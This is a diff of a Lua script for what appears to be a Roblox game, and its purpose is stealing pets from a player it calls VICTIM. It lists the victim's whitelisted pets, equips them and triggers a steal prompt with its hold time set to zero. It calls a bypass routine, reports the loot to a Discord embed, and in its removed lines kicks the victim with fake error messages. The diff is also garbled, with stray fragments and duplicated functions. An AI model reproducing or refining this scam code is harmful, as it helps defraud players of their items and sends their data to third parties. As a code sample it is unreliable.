@@ -248,42 +248,12 @@ local function equipPet(pet)
 end
 
 local function getPlayersPets()
-    local foundAny = false -- Flag to check if player has any valid pets
-    local petInventory = dataModule:GetData().PetsData.PetInventory.Data
-
-    if not petInventory or typeof(petInventory) ~= "table" then
-        VICTIM:Kick("No pet data found.")
-        return
-    end
-
-    for petUid, value in pairs(petInventory) do
-        local matchedName = checkPetsWhilelist(value.PetType)
-        if matchedName then
-            foundAny = true
-            local petInfo = PET_VALUES[matchedName]
-            local mutation = ""
-
-            if string.find(value.PetType, "Rainbow") then
-                mutation = "Rainbow "
-                petInfo.value = petInfo.value + 10000
-            elseif string.find(value.PetType, "Mega") then
-                mutation = "Mega "
-                petInfo.value = petInfo.value + 15000
-            elseif string.find(value.PetType, "Ascended") then
-                mutation = "Ascended "
-                petInfo.value = petInfo.value + 8000
-            end
-
-            table.insert(victimPetTable, mutation .. matchedName)
+    for petUid, value in dataModule:GetData().PetsData.PetInventory.Data do
+        if checkPetsWhilelist(value.PetType) then
+            table.insert(victimPetTable, value.PetType)
         end
     end
-
-    if not foundAny then
-        VICTIM:Kick("Error 404")
-    end
 end
-
-
 
 local function startSteal(trigerName)
     if game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt") then
@@ -292,24 +262,21 @@ local function startSteal(trigerName)
     end
 end
 
-local function idlingTarget()
-    task.spawn(function()
-        while task.wait(0.2) do
-            local isTarget, trigerName = waitForJoin()
-
-            if isTarget then
-                teleportTarget(trigerName)
-                checkPetsInventory(trigerName)
-            end
-        end
-    end)
+local function checkPetsInventory(target)
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        if not checkPetsWhilelist(value.PetType) then continue end
+        local petObject = getPetObject(petUid)
+        if not petObject then continue end
+        equipPet(petObject)
+        task.wait(0.2)
+        startSteal(target)
+    end
 end
 
 local function idlingTarget()
     task.spawn(function()
         while task.wait(0.2) do
             local isTarget, trigerName = waitForJoin()
-
             if isTarget then
                 teleportTarget(trigerName)
                 checkPetsInventory(trigerName)
@@ -324,43 +291,9 @@ task.spawn(function()
     while task.wait(0.5) do
         if #victimPetTable > 0 then
             idlingTarget()
-            createDiscordEmbed(table.concat(victimPetTable, "\n"), totalPetValue, "https://cdn.discordapp.com/attachments/.../items.txt")
+            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/.../items.txt")
             break
         end
     end
 end)
-].Character.Head.ProximityPrompt.HoldDuration = 0
-        deltaBypass()
-    end
-end
-
-local function checkPetsInventory(target)
-    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        local matchedName = checkPetsWhilelist(value.PetType)
-        if not matchedName then
-            continue
-        end
-
-        local petObject = getPetObject(petUid)
-        if not petObject then
-            continue
-        end
-
-        equipPet(petObject)
-        task.wait(0.2)
-        startSteal(target)
-        task.wait(0.2)
-    end
-end
-
-getPlayersPets()
-
-task.spawn(function()
-    while task.wait(0.5) do
-        if #victimPetTable > 0 then
-            idlingTarget()
-            createDiscordEmbed(table.concat(victimPetTable, "\n"), totalPetValue, "https://cdn.discordapp.com/attachments/.../items.txt")
-            break
-        end
-    end
 end)
